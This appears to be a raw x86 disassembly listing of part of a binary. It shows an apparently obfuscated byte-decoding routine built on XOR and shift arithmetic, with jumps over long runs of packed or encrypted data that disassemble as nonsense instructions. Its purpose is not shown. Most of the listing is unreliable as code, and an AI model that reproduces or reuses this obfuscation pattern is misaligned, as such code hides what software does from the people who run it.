  407df7:	outs   dx,BYTE PTR ds:[esi]
  407df8:	lds    edx,FWORD PTR [ebp+0x16]
  407dfb:	sbb    esp,DWORD PTR [ebp+0x32]
  407dfe:	mov    ch,0x92
  407e00:	push   esi
  407e01:	outs   dx,DWORD PTR ds:[esi]
  407e02:	outs   dx,DWORD PTR ds:[esi]
  407e03:	push   ds
  407e04:	leave  
  407e05:	sub    al,0x16
  407e07:	stos   BYTE PTR es:[edi],al
  407e08:	cmc    
  407e09:	js     0x407df2
  407e0b:	jle    0x407d9c
  407e0d:	add    DWORD PTR [ebx-0x53f0f3b3],ecx
  407e13:	enter  0xc102,0xe9
  407e17:	add    cl,BYTE PTR [ebx+0x558b084d]
  407e1d:	or     al,0x33
  407e1f:	mov    ecx,0xd2331ee1
  407e25:	or     eax,edx
  407e27:	add    eax,DWORD PTR ds:0x422728
  407e2d:	mov    DWORD PTR [ebp+0x14],eax
  407e30:	mov    eax,DWORD PTR [ebp+0x8]
  407e33:	mov    ecx,DWORD PTR [ebp+0xc]
  407e36:	shrd   eax,ecx,0x2
  407e3a:	shr    ecx,0x2
  407e3d:	mov    ecx,DWORD PTR [ebp+0x8]
  407e40:	mov    edx,DWORD PTR [ebp+0xc]
  407e43:	xor    eax,edi
  407e45:	shl    ecx,0x1e
  407e48:	xor    edx,edx
  407e4a:	or     eax,edx
  407e4c:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  407e50:	mov    eax,DWORD PTR [ebp+0x14]
  407e53:	xor    BYTE PTR [eax],cl
  407e55:	mov    eax,DWORD PTR [ebp-0x60]
  407e58:	mov    ecx,DWORD PTR [ebp-0x5c]
  407e5b:	shrd   eax,ecx,0x2
  407e5f:	shr    ecx,0x2
  407e62:	mov    ecx,DWORD PTR [ebp-0x60]
  407e65:	mov    edx,DWORD PTR [ebp-0x5c]
  407e68:	xor    eax,edi
  407e6a:	shl    ecx,0x1e
  407e6d:	xor    edx,edx
  407e6f:	or     eax,edx
  407e71:	add    eax,DWORD PTR ds:0x422728
  407e77:	mov    DWORD PTR [ebp+0x14],eax
  407e7a:	mov    eax,DWORD PTR [ebp-0x60]
  407e7d:	mov    ecx,DWORD PTR [ebp-0x5c]
  407e80:	shrd   eax,ecx,0x2
  407e84:	shr    ecx,0x2
  407e87:	mov    ecx,DWORD PTR [ebp-0x60]
  407e8a:	mov    edx,DWORD PTR [ebp-0x5c]
  407e8d:	xor    eax,edi
  407e8f:	shl    ecx,0x1e
  407e92:	xor    edx,edx
  407e94:	or     eax,edx
  407e96:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  407e9a:	mov    eax,DWORD PTR [ebp+0x14]
  407e9d:	or     BYTE PTR [eax],cl
  407e9f:	mov    eax,DWORD PTR [ebp-0x48]
  407ea2:	mov    ecx,DWORD PTR [ebp-0x44]
  407ea5:	shrd   eax,ecx,0x2
  407ea9:	shr    ecx,0x2
  407eac:	mov    ecx,DWORD PTR [ebp-0x48]
  407eaf:	mov    edx,DWORD PTR [ebp-0x44]
  407eb2:	xor    eax,edi
  407eb4:	jmp    0x408255
  407eb9:	out    0x23,al
  407ebb:	pop    ss
  407ebc:	jns    0x407ed9
  407ebe:	jns    0x407e6b
  407ec0:	mov    bl,0xaa
  407ec2:	repz ror edi,0x83
  407ec6:	xor    eax,0x65be9208
  407ecb:	mov    esi,0xbec4bdbe
  407ed0:	mov    esi,0xdce199ff
  407ed5:	sahf   
  407ed6:	(bad)  
  407ed7:	leave  
  407ed8:	mov    ecx,0x257b6e92
  407edd:	fldenv ds:0x79b051c8
  407ee3:	sub    BYTE PTR [ebx+ebx*8+0x6c08b014],bh
  407eea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407eeb:	ret    0xba02
  407eee:	inc    ecx
  407eef:	fldenv [ebp-0x7117ed7d]
  407ef5:	leave  
  407ef6:	fucom  st(7)
  407ef8:	cdq    
  407ef9:	mov    ecx,0x5e18382e
  407efe:	pop    ebp
  407eff:	push   ds
  407f00:	popa   
  407f01:	mov    esi,ebx
  407f03:	adc    DWORD PTR [ebx],ebp
  407f05:	mov    ah,BYTE PTR [edx-0x4d]
  407f08:	adc    DWORD PTR [ebp+0x1b345632],ebp
  407f0e:	adc    dl,dh
  407f10:	inc    eax
  407f11:	push   ss
  407f12:	sub    edx,DWORD PTR [eax+0x235a1876]
  407f18:	imul   ecx,DWORD PTR [edi],0xffffff91
  407f1b:	ins    DWORD PTR es:[edi],dx
  407f1c:	je     0x407f0e
  407f1e:	dec    eax
  407f1f:	xchg   DWORD PTR [ebp-0x6f],edx
  407f22:	scas   eax,DWORD PTR es:[edi]
  407f23:	nop
  407f24:	mov    esi,0xb9780dd8
  407f29:	mov    al,0xb5
  407f2b:	adc    DWORD PTR ds:0x16840c27,ebp
  407f31:	aaa    
  407f32:	in     al,dx
  407f33:	sbb    esp,DWORD PTR gs:[edi-0x24920f5a]
  407f3a:	or     cl,BYTE PTR [ebx]
  407f3c:	inc    ebx
  407f3d:	push   ecx
  407f3e:	rcr    DWORD PTR gs:[ebx],cl
  407f41:	mov    ch,0x43
  407f43:	push   ss
  407f44:	mov    dh,0x23
  407f46:	mov    ah,0xe4
  407f48:	lea    ebx,[ebx-0x69]
  407f4b:	xchg   DWORD PTR [ebx+0x202e7e50],eax
  407f51:	cmp    ecx,DWORD PTR [edx-0x10138e4b]
  407f57:	xchg   ecx,eax
  407f58:	cmp    esp,DWORD PTR [ebx-0x33ecd61a]
  407f5e:	cwde   
  407f5f:	fimul  WORD PTR [eax+0x57d3dbc1]
  407f65:	pop    edi
  407f66:	call   0x61d0:0x5685be99
  407f6d:	sub    dl,al
  407f6f:	mov    bh,BYTE PTR [esi+eax*4+0xb29b01]
  407f76:	xor    esp,edi
  407f78:	lods   al,BYTE PTR ds:[esi]
  407f79:	es mov edx,0x54370554
  407f7f:	adc    eax,DWORD PTR [esi-0x1d]
  407f82:	and    ecx,DWORD PTR [ecx+esi*4]
  407f85:	and    al,BYTE PTR [ebx-0x58]
  407f88:	icebp  
  407f89:	and    al,0xd3
  407f8b:	add    BYTE PTR [eax+0x74d6246d],bl
  407f91:	pop    ebx
  407f92:	dec    edx
  407f93:	adc    al,0x89
  407f95:	xor    DWORD PTR [edx+eiz*4],ebp
  407f98:	les    ebx,FWORD PTR [edi-0x17]
  407f9b:	mov    ah,0x27
  407f9d:	adc    ebx,ebp
  407f9f:	push   es
  407fa0:	add    BYTE PTR [eax+0x4a1a2115],ch
  407fa6:	push   esp
  407fa7:	cmp    esp,DWORD PTR [esp+ecx*8+0x1d]
  407fab:	jmp    0xe14085b7
  407fb0:	rol    BYTE PTR [esi],1
  407fb2:	fild   DWORD PTR [edx+0x4508f984]
  407fb8:	mov    ecx,0xecc522ab
  407fbd:	popa   
  407fbe:	shr    BYTE PTR [ebx-0x41ee4c11],1
  407fc4:	pop    ebp
  407fc5:	(bad)  
  407fc7:	inc    ebp
  407fc8:	sub    eax,0xff3bb5c3
  407fcd:	jge    0x407fbb
  407fcf:	jmp    FWORD PTR [esp+edi*2-0x73]
  407fd3:	ror    DWORD PTR [ebx+0x8],cl
  407fd6:	test   al,0x80
  407fd8:	in     al,dx
  407fd9:	and    dl,0x5f
  407fdc:	stos   DWORD PTR es:[edi],eax
  407fdd:	mov    ch,bh
  407fdf:	inc    ebx
  407fe0:	in     eax,0x59
  407fe2:	imul   eax,DWORD PTR [ebx],0xffffff85
  407fe5:	in     al,dx
  407fe6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407fe7:	aaa    
  407fe8:	not    BYTE PTR [eax-0x2e7d631a]
  407fee:	stos   DWORD PTR es:[edi],eax
  407fef:	(bad)  
  407ff1:	jge    0x407f86
  407ff3:	fcom   DWORD PTR [eax+0x38]
  407ff6:	out    dx,al
  407ff7:	daa    
  407ff8:	retf   
  407ff9:	dec    esi
  407ffa:	ins    BYTE PTR es:[edi],dx
  407ffb:	jne    0x408017
  407ffd:	rcl    DWORD PTR ds:0x7069b126,0x40
  408004:	pop    ebp
  408005:	xor    eax,edx
  408007:	jg     0x407f9a
  408009:	xlat   BYTE PTR ds:[ebx]
  40800a:	aaa    
  40800b:	fstp   DWORD PTR [eax]
  40800d:	inc    esi
  40800e:	jne    0x40808a
  408010:	dec    esi
  408011:	jecxz  0x407f9e
  408013:	push   edi
  408014:	lods   al,BYTE PTR ds:[esi]
  408015:	hlt    
  408016:	cmp    bh,ah
  408018:	or     DWORD PTR [esi-0x2f5123bc],eax
  40801e:	test   al,0x4f
  408020:	inc    esp
  408021:	xor    esi,DWORD PTR [ecx-0x41]
  408024:	and    al,0x49
  408026:	or     eax,0x8933fcdf
  40802b:	mov    ds:0x233e8a32,al
  408030:	aam    0x4e
  408032:	inc    eax
  408033:	sar    bl,cl
  408035:	aam    0xf6
  408037:	call   0xdf9f7b5f
  40803c:	ja     0x408097
  40803e:	popa   
  40803f:	sub    al,0x30
  408041:	xchg   edx,eax
  408042:	jmp    0x407fea
  408044:	dec    ecx
  408045:	stc    
  408046:	test   eax,0x52bf9b1d
  40804b:	aas    
  40804c:	(bad)  
  40804d:	xor    al,0x4f
  40804f:	lock outs dx,BYTE PTR ds:[esi]
  408051:	(bad)  [esi]
  408053:	pop    ebp
  408054:	addr16 xchg ecx,eax
  408056:	cmc    
  408057:	aaa    
  408058:	cs dec eax
  40805a:	mov    dh,0xdb
  40805c:	adc    DWORD PTR [edi+0x4b408572],esi
  408062:	arpl   WORD PTR es:[ebx],sp
  408065:	ret    0xb8fc
  408068:	and    edx,DWORD PTR [esi]
  40806a:	xchg   DWORD PTR ds:0xa995c64c,esp
  408070:	out    dx,eax
  408071:	pop    eax
  408072:	aad    0x7d
  408074:	(bad)  
  408075:	sbb    BYTE PTR [eax],al
  408077:	sar    BYTE PTR [ebx],1
  408079:	out    0xcb,al
  40807b:	cdq    
  40807c:	in     al,0x37
  40807e:	retf   
  40807f:	inc    ecx
  408080:	leave  
  408081:	inc    eax
  408082:	mov    ebp,DWORD PTR [edx+ebx*8-0x5]
  408086:	js     0x408088
  408088:	push   esi
  408089:	cmp    bh,ch
  40808b:	test   eax,0x720639ed
  408090:	or     al,0x92
  408092:	fild   QWORD PTR [ebx+edi*4+0x22]
  408096:	(bad)  
  408097:	not    dh
  408099:	push   es
  40809a:	and    DWORD PTR [ecx+0x4d70fc96],ecx
  4080a0:	inc    ebp
  4080a1:	sub    al,0x5b
  4080a3:	mov    al,ds:0x473b1a2d
  4080a8:	push   0xe4487588
  4080ad:	xlat   BYTE PTR ds:[ebx]
  4080ae:	inc    esp
  4080af:	unpcklps xmm3,XMMWORD PTR [esi+edi*8-0x3ae297bb]
  4080b7:	cmp    BYTE PTR [ebx],dl
  4080b9:	add    BYTE PTR [ecx],dh
  4080bb:	sub    eax,esp
  4080bd:	scas   eax,DWORD PTR es:[edi]
  4080be:	mov    bl,0xe2
  4080c0:	scas   eax,DWORD PTR es:[edi]
  4080c1:	jge    0x4080ce
  4080c3:	jne    0x4080d6
  4080c5:	push   esp
  4080c6:	scas   eax,DWORD PTR es:[edi]
  4080c7:	call   0xd714fb9c
  4080cc:	add    dh,bh
  4080ce:	data16 cmp ch,ch
  4080d1:	ja     0x4080d7
  4080d3:	repnz test eax,0x8325e029
  4080d9:	push   es
  4080da:	mov    es,WORD PTR [edx+0x239fcd39]
  4080e0:	fistp  WORD PTR [eax+ecx*4]
  4080e3:	cs stos BYTE PTR es:[edi],al
  4080e5:	imul   esp,DWORD PTR [ebx+0x33],0xffffff83
  4080e9:	inc    ebp
  4080ea:	pop    ebx
  4080eb:	xchg   ebp,eax
  4080ec:	int    0xf1
  4080ee:	scas   eax,DWORD PTR es:[edi]
  4080ef:	lods   eax,DWORD PTR ds:[esi]
  4080f0:	fsubp  st(7),st
  4080f2:	or     BYTE PTR [ebx+0x3ef60650],al
  4080f8:	mov    ch,0x5e
  4080fa:	or     edi,ebx
  4080fc:	jb     0x4080c0
  4080fe:	cwde   
  4080ff:	or     DWORD PTR [edx-0x13],esp
  408102:	mov    al,BYTE PTR [eax]
  408104:	pop    eax
  408105:	mov    ch,0x29
  408107:	mov    es,WORD PTR [ecx+0x7e]
  40810a:	inc    eax
  40810b:	cmp    dl,BYTE PTR [ebp+0x54]
  40810e:	ins    BYTE PTR es:[edi],dx
  40810f:	cld    
  408110:	cs ret 
  408112:	fsubr  st,st(6)
  408114:	push   esp
  408115:	mov    ah,0x66
  408117:	mov    al,0x2d
  408119:	popf   
  40811a:	je     0x408152
  40811c:	cwde   
  40811d:	push   ds
  40811e:	loop   0x4080df
  408120:	mov    ds:0x206fd872,al
  408125:	fs jp  0x408163
  408128:	mov    al,0x5e
  40812a:	pusha  
  40812b:	mov    ds:0x72da78bd,eax
  408130:	(bad)  [ebx-0x3a]
  408133:	jne    0x408145
  408135:	xchg   ecx,eax
  408136:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408137:	xchg   ebx,eax
  408138:	(bad)  
  408139:	out    0x4a,al
  40813b:	mov    WORD PTR [esi],ss
  40813d:	adc    al,BYTE PTR [ecx+0xfafba17]
  408143:	enter  0x16f5,0x97
  408147:	mov    edx,0x23af2972
  40814c:	dec    esp
  40814d:	das    
  40814e:	scas   eax,DWORD PTR es:[edi]
  40814f:	retf   0x8afe
  408152:	mov    ds:0x30e89efe,eax
  408157:	dec    ebp
  408158:	rcl    ch,1
  40815a:	xchg   si,ax
  40815c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40815d:	outs   dx,DWORD PTR ds:[esi]
  40815e:	arpl   WORD PTR [bx+di],sp
  408161:	push   ss
  408162:	mov    esi,0xb4773740
  408167:	scas   al,BYTE PTR es:[edi]
  408168:	mov    ds:0xe2d37494,eax
  40816d:	out    dx,eax
  40816e:	and    DWORD PTR [esi],0x4e
  408171:	xchg   edi,eax
  408172:	add    dh,BYTE PTR [edi+ecx*2+0x3f]
  408176:	out    0x93,eax
  408178:	xlat   BYTE PTR ds:[ebx]
  408179:	push   cs
  40817a:	cmp    eax,0x3d0c5aa9
  40817f:	jns    0x40816a
  408181:	push   cs
  408182:	int    0xe6
  408184:	faddp  st(7),st
  408186:	aam    0x55
  408188:	in     al,dx
  408189:	xor    BYTE PTR [ecx-0x58],bl
  40818c:	push   esi
  40818d:	mov    eax,0x5489f670
  408192:	out    0xa9,al
  408194:	lock out dx,al
  408196:	cmp    al,BYTE PTR [edx+0x384deb80]
  40819c:	(bad)  
  40819d:	arpl   WORD PTR [edi],di
  40819f:	mov    cl,0x9d
  4081a1:	in     eax,dx
  4081a2:	jle    0x408187
  4081a4:	mov    ch,0xb5
  4081a6:	pop    es
  4081a7:	adc    DWORD PTR [edi+esi*2+0x4d],edx
  4081ab:	inc    edx
  4081ac:	jns    0x408162
  4081ae:	scas   al,BYTE PTR es:[edi]
  4081af:	sbb    BYTE PTR [esi],ch
  4081b1:	add    cl,ch
  4081b3:	or     bl,bh
  4081b5:	add    al,0xdf
  4081b7:	jmp    0xe926791
  4081bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081bd:	add    ch,BYTE PTR [esi+esi*2-0x5c8a2399]
  4081c4:	dec    ebp
  4081c5:	cld    
  4081c6:	aad    0xee
  4081c8:	nop
  4081c9:	out    0x4,eax
  4081cb:	call   0x4522:0x9a0340fe
  4081d2:	cld    
  4081d3:	push   eax
  4081d4:	xchg   BYTE PTR [esi-0x71ac542e],ah
  4081da:	push   es
  4081db:	dec    ebp
  4081dc:	cld    
  4081dd:	psrad  mm3,QWORD PTR [esi-0x646cc9]
  4081e4:	jg     0x408258
  4081e6:	cmp    ecx,DWORD PTR [ecx+0x4a25ffb2]
  4081ec:	das    
  4081ed:	add    eax,0x3f6a615
  4081f2:	adc    bl,BYTE PTR [esi-0x5840819a]
  4081f8:	cli    
  4081f9:	aam    0x98
  4081fb:	out    0xa3,al
  4081fd:	ds dec edi
  4081ff:	arpl   WORD PTR [ecx-0x6951e73b],bx
  408205:	frstor [ecx+0x44]
  408208:	push   0xffffff94
  40820a:	xor    al,0x15
  40820c:	sub    DWORD PTR [edx+0x2b],0x128ff482
  408213:	add    ebp,DWORD PTR [ebp+esi*2-0x67]
  408217:	jbe    0x4081cf
  408219:	fwait
  40821a:	outs   dx,DWORD PTR ds:[esi]
  40821b:	lods   eax,DWORD PTR ds:[esi]
  40821c:	mov    eax,0xafa82f3a
  408221:	and    BYTE PTR [ecx-0x19d9f07a],dl
  408227:	mov    bh,0xd5
  408229:	mov    eax,ds:0x55326253
  40822e:	enter  0xf186,0x98
  408232:	xchg   ecx,eax
  408233:	jg     0x408299
  408235:	push   edx
  408236:	out    0xc9,eax
  408238:	cld    
  408239:	push   es
  40823a:	repnz das 
  40823c:	repz sbb al,0x6a
  40823f:	out    dx,al
  408240:	dec    esi
  408241:	outs   dx,BYTE PTR ds:[esi]
  408242:	add    DWORD PTR [ebx],ecx
  408244:	outs   dx,BYTE PTR ds:[esi]
  408245:	lock sbb DWORD PTR [eax+0x705f2f76],edi
  40824c:	mov    bl,0xfc
  40824e:	mov    dl,0x44
  408250:	or     eax,0x4585aac
  408255:	xor    edx,edx
  408257:	or     eax,edx
  408259:	add    eax,DWORD PTR ds:0x422728
  40825f:	shl    ecx,0x1e
  408262:	mov    DWORD PTR [ebp+0x14],eax
  408265:	mov    eax,DWORD PTR [ebp-0x48]
  408268:	mov    ecx,DWORD PTR [ebp-0x44]
  40826b:	shrd   eax,ecx,0x2
  40826f:	shr    ecx,0x2
  408272:	mov    ecx,DWORD PTR [ebp-0x48]
  408275:	mov    edx,DWORD PTR [ebp-0x44]
  408278:	xor    eax,edi
  40827a:	shl    ecx,0x1e
  40827d:	xor    edx,edx
  40827f:	or     eax,edx
  408281:	mov    cl,BYTE PTR [ebp+eax*1-0x4]
  408285:	mov    eax,DWORD PTR [ebp+0x14]
  408288:	add    BYTE PTR [eax],cl
  40828a:	mov    eax,DWORD PTR [ebp-0x38]
  40828d:	mov    ecx,DWORD PTR [ebp-0x34]
  408290:	shrd   eax,ecx,0x2
  408294:	xor    eax,edi
  408296:	shr    ecx,0x2
  408299:	mov    ecx,DWORD PTR [ebp-0x38]
  40829c:	mov    edx,DWORD PTR [ebp-0x34]
  40829f:	shl    ecx,0x1e
  4082a2:	mov    ecx,DWORD PTR [ebp-0x38]
  4082a5:	xor    edx,edx
  4082a7:	or     eax,edx
  4082a9:	mov    edx,DWORD PTR [ebp-0x34]
  4082ac:	add    eax,DWORD PTR ds:0x422728
  4082b2:	shrd   ecx,edx,0x2
  4082b6:	xor    ecx,edi
  4082b8:	shr    edx,0x2
  4082bb:	mov    edx,DWORD PTR [ebp-0x38]
  4082be:	mov    edi,DWORD PTR [ebp-0x34]
  4082c1:	xor    edi,edi
  4082c3:	or     ecx,edi
  4082c5:	mov    cl,BYTE PTR [ebp+ecx*1-0x4]
  4082c9:	or     BYTE PTR [eax],cl
  4082cb:	mov    eax,DWORD PTR [esi]
  4082cd:	mov    ecx,DWORD PTR [esi+0x4]
  4082d0:	shl    eax,0x1e
  4082d3:	shl    edx,0x1e
  4082d6:	mov    edx,DWORD PTR [esi]
  4082d8:	mov    edi,DWORD PTR [esi+0x4]
  4082db:	xor    edi,0x9c2b8ae8
  4082e1:	xor    eax,0x80000000
  4082e6:	mov    DWORD PTR [ebp+0x14],eax
  4082e9:	mov    eax,0xcb79b577
  4082ee:	xor    edx,eax
  4082f0:	shrd   edx,edi,0x2
  4082f4:	shr    edi,0x2
  4082f7:	or     edi,DWORD PTR [ebp+0x14]
  4082fa:	xor    ecx,ecx
  4082fc:	or     edx,ecx
  4082fe:	mov    ecx,DWORD PTR [ebx]
  408300:	mov    DWORD PTR [ebp-0x64],edi
  408303:	mov    edi,DWORD PTR [ebx+0x4]
  408306:	mov    edi,ecx
  408308:	xor    ecx,ecx
  40830a:	shl    edi,0x1e
  40830d:	xor    edi,0x80000000
  408313:	mov    DWORD PTR [ebp+0x10],ecx
  408316:	mov    ecx,DWORD PTR [ebx]
  408318:	mov    DWORD PTR [ebp+0x14],edi
  40831b:	mov    edi,DWORD PTR [ebx+0x4]
  40831e:	xor    ecx,eax
  408320:	xor    edi,0x9c2b8ae8
  408326:	shrd   ecx,edi,0x2
  40832a:	or     ecx,DWORD PTR [ebp+0x10]
  40832d:	shr    edi,0x2
  408330:	mov    DWORD PTR [ebp-0x70],ecx
  408333:	mov    ecx,edi
  408335:	or     ecx,DWORD PTR [ebp+0x14]
  408338:	mov    DWORD PTR [ebp+0xc],edi
  40833b:	cmp    edx,DWORD PTR [ebp-0x70]
  40833e:	jne    0x408bb3
  408344:	cmp    DWORD PTR [ebp-0x64],ecx
  408347:	jne    0x408bb3
  40834d:	jmp    0x4083eb
  408352:	mov    eax,DWORD PTR [esi]
  408354:	mov    edx,DWORD PTR [esi+0x4]
  408357:	mov    eax,DWORD PTR [esi]
  408359:	mov    edx,DWORD PTR [esi+0x4]
  40835c:	mov    edx,eax
  40835e:	xor    eax,eax
  408360:	shl    edx,0x1e
  408363:	mov    DWORD PTR [ebp+0x10],eax
  408366:	mov    eax,DWORD PTR [esi]
  408368:	xor    edx,0x80000000
  40836e:	mov    DWORD PTR [ebp+0x14],edx
  408371:	mov    edx,DWORD PTR [esi+0x4]
  408374:	xor    eax,0xcb79b577
  408379:	xor    ecx,edx
  40837b:	shrd   eax,ecx,0x2
  40837f:	or     eax,DWORD PTR [ebp+0x10]
  408382:	shr    ecx,0x2
  408385:	mov    DWORD PTR [ebp+0x8],eax
  408388:	mov    eax,ecx
  40838a:	or     eax,DWORD PTR [ebp+0x14]
  40838d:	mov    ecx,DWORD PTR [ebx]
  40838f:	mov    edx,DWORD PTR [ebx+0x4]
  408392:	push   eax
  408393:	push   DWORD PTR [ebp+0x8]
  408396:	push   edx
  408397:	push   ecx
  408398:	call   0x41594e
  40839d:	mov    eax,DWORD PTR [esi]
  40839f:	mov    ecx,DWORD PTR [esi+0x4]
  4083a2:	shrd   eax,ecx,0x2
  4083a6:	shr    ecx,0x2
  4083a9:	shr    edx,0x1e
  4083ac:	xor    ecx,0xe70ae2ba
  4083b2:	push   ecx
  4083b3:	xor    eax,edi
  4083b5:	mov    DWORD PTR [ebp+0x10],edx
  4083b8:	mov    edx,DWORD PTR [ebx]
  4083ba:	mov    edi,DWORD PTR [ebx+0x4]
  4083bd:	push   eax
  4083be:	push   edi
  4083bf:	push   edx
  4083c0:	call   0x41594e
  4083c5:	shld   edx,eax,0x2
  4083c9:	shl    eax,0x2
  4083cc:	mov    ecx,eax
  4083ce:	or     ecx,DWORD PTR [ebp+0x10]
  4083d1:	xor    eax,eax
  4083d3:	or     edx,eax
  4083d5:	xor    ecx,0xcb79b576
  4083db:	xor    edx,0x9c2b8ae8
  4083e1:	mov    DWORD PTR [esi],ecx
  4083e3:	mov    DWORD PTR [esi+0x4],edx
  4083e6:	mov    eax,0xcb79b577
  4083eb:	mov    ecx,DWORD PTR [esi]
  4083ed:	mov    edx,DWORD PTR [esi+0x4]
  4083f0:	mov    edx,ecx
  4083f2:	shl    edx,0x1e
  4083f5:	xor    edx,0x80000000
  4083fb:	mov    DWORD PTR [ebp+0x14],edx
  4083fe:	mov    edx,DWORD PTR [esi]
  408400:	mov    edi,DWORD PTR [esi+0x4]
  408403:	xor    edi,0x9c2b8ae8
  408409:	xor    edx,eax
  40840b:	shrd   edx,edi,0x2
  40840f:	shr    edi,0x2
  408412:	or     edi,DWORD PTR [ebp+0x14]
  408415:	xor    ecx,ecx
  408417:	or     edx,ecx
  408419:	mov    ecx,DWORD PTR [ebx]
  40841b:	mov    DWORD PTR [ebp+0xc],edi
  40841e:	mov    edi,DWORD PTR [ebx+0x4]
  408421:	mov    edi,ecx
  408423:	xor    ecx,ecx
  408425:	shl    edi,0x1e
  408428:	mov    DWORD PTR [ebp+0x10],ecx
  40842b:	mov    ecx,DWORD PTR [ebx]
  40842d:	xor    edi,0x80000000
  408433:	mov    DWORD PTR [ebp+0x14],edi
  408436:	mov    edi,DWORD PTR [ebx+0x4]
  408439:	xor    eax,ecx
  40843b:	jmp    0x4087dc
  408440:	xor    eax,0x7b36559b
  408445:	cmp    al,0xb6
  408447:	pushf  
  408448:	pop    eax
  408449:	out    dx,eax
  40844a:	push   0xffffffd1
  40844c:	pop    ebx
  40844d:	or     bh,BYTE PTR [edi-0x41944231]
  408453:	mov    esi,0xbebec4bd
  408458:	(bad)  
  40845a:	mov    esi,0xd03fd6c3
  40845f:	hlt    
  408460:	int3   
  408461:	jb     0x40843e
  408463:	xchg   edi,edx
  408465:	sbb    ah,dh
  408467:	jo     0x40840e
  408469:	xlat   BYTE PTR ds:[ebx]
  40846a:	in     al,0xed
  40846c:	sub    esi,DWORD PTR [eax+eax*8-0x21]
  408470:	fs pushf 
  408472:	cmc    
  408473:	jmp    0x7222:0xba9c07be
  40847a:	xchg   esi,eax
  40847b:	mov    dh,0x61
  40847d:	addr16 or eax,0x5b
  408481:	xchg   BYTE PTR [edx+0x7ae3fbf5],dl
  408487:	inc    edi
  408488:	mov    cl,0x72
  40848a:	xor    bl,0xc4
  40848d:	mov    ebp,0xd596c1e9
  408492:	aaa    
  408493:	mov    edi,0x46b849f3
  408498:	mov    ch,0x7b
  40849a:	scas   al,BYTE PTR es:[edi]
  40849b:	inc    edx
  40849c:	test   al,0x43
  40849e:	dec    ebx
  40849f:	gs cmp bl,al
  4084a2:	sar    BYTE PTR [esi+0x7e17f665],1
  4084a8:	clc    
  4084a9:	rol    DWORD PTR [ebx+0x69d08ebb],1
  4084af:	rol    BYTE PTR [ebp+0x54],1
  4084b2:	pop    es
  4084b3:	ds jb  0x40848a
  4084b6:	xor    al,dh
  4084b8:	js     0x408531
  4084ba:	mov    edx,0x98f5c783
  4084bf:	sub    al,0x42
  4084c1:	imul   esp,DWORD PTR [edi-0x13010ae3],0x27
  4084c8:	and    eax,0xbf48b4f
  4084cd:	inc    eax
  4084ce:	jb     0x408493
  4084d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4084d1:	je     0x408497
  4084d3:	les    esi,FWORD PTR [ebx]
  4084d5:	inc    eax
  4084d6:	adc    esi,ecx
  4084d8:	and    al,0x71
  4084da:	xor    eax,0xa2a2e498
  4084df:	std    
  4084e0:	addr16 cdq 
  4084e2:	pusha  
  4084e3:	fdiv   QWORD PTR [eax+edi*2-0x7b79634f]
  4084ea:	lds    ebx,FWORD PTR [edx+0x2900e3a6]
  4084f0:	jp     0x4084ea
  4084f2:	inc    ebp
  4084f3:	repz cmp BYTE PTR [esi],ch
  4084f6:	test   DWORD PTR [ebp-0x66],eax
  4084f9:	test   DWORD PTR [ecx+0x33],ecx
  4084fc:	add    bl,0xf3
  4084ff:	scas   eax,DWORD PTR es:[edi]
  408500:	pop    esi
  408501:	neg    BYTE PTR [eax+0x15]
  408504:	dec    ebx
  408505:	lods   al,BYTE PTR ds:[esi]
  408506:	add    ah,BYTE PTR [edi+0x3568bd10]
  40850c:	fwait
  40850d:	scas   al,BYTE PTR es:[edi]
  40850e:	iret   
  40850f:	pushf  
  408510:	dec    ecx
  408511:	iret   
  408512:	adc    al,0x3
  408514:	pop    ds
  408515:	push   ebx
  408516:	scas   al,BYTE PTR es:[edi]
  408517:	outs   dx,BYTE PTR ds:[si]
  408519:	xchg   ebp,eax
  40851a:	jg     0x408508
  40851c:	nop
  40851d:	adc    BYTE PTR [ecx],bl
  40851f:	xchg   ecx,eax
  408520:	ret    
  408521:	add    al,0x48
  408523:	xor    al,0x34
  408525:	dec    esp
  408526:	adc    esi,DWORD PTR [edx+ecx*1]
  408529:	sub    DWORD PTR [ebx-0x2e],ecx
  40852c:	lods   eax,DWORD PTR ds:[esi]
  40852d:	mov    ds:0x6075b441,eax
  408532:	ret    0x6863
  408535:	pusha  
  408536:	xchg   ecx,eax
  408537:	adc    dl,ch
  408539:	(bad)  
  40853a:	lahf   
  40853b:	mov    ecx,0x514c69
  408540:	out    dx,al
  408541:	adc    bh,BYTE PTR [ebp-0x64]
  408544:	push   ds
  408545:	jmp    edx
  408547:	retf   
  408548:	out    dx,eax
  408549:	or     BYTE PTR [ebx-0x6b],bh
  40854c:	loope  0x408539
  40854e:	jmp    0xbb79:0x7eb11d6d
  408555:	mov    bl,0xf7
  408557:	hlt    
  408558:	repnz scas al,BYTE PTR es:[edi]
  40855a:	sbb    eax,0x66169634
  40855f:	mov    ebx,0x77893403
  408564:	jae    0x4084fb
  408566:	jecxz  0x408539
  408568:	sub    ah,BYTE PTR [eax-0x13]
  40856b:	pop    edi
  40856c:	int3   
  40856d:	out    dx,eax
  40856e:	into   
  40856f:	mov    ebx,es
  408571:	mov    fs,esp
  408573:	neg    BYTE PTR [ecx+0x72]
  408576:	xchg   ebp,ebx
  408578:	add    esp,DWORD PTR [edi]
  40857a:	fdivr  QWORD PTR [edi]
  40857c:	call   0xa33c:0x82d30c27
  408583:	imul   esi,edi,0x7b
  408586:	ds push edi
  408588:	xchg   ebx,eax
  408589:	cmp    eax,0x5678dee6
  40858e:	adc    esi,eax
  408590:	cmp    ebp,DWORD PTR [ebx-0x28]
  408593:	pop    ebp
  408594:	sahf   
  408595:	idiv   ch
  408597:	adc    esi,DWORD PTR [ecx-0x4c]
  40859a:	sbb    ebx,ebp
  40859c:	loop   0x4085a9
  40859e:	(bad)  
  40859f:	cli    
  4085a0:	push   ebx
  4085a1:	test   eax,0xd94ef56b
  4085a6:	in     eax,dx
  4085a7:	lods   eax,DWORD PTR ds:[esi]
  4085a8:	xor    al,0x3f
  4085aa:	mov    esp,0xfe77f841
  4085af:	jb     0x40853b
  4085b1:	xor    DWORD PTR [esi-0x5fda146e],ecx
  4085b7:	dec    ecx
  4085b8:	push   eax
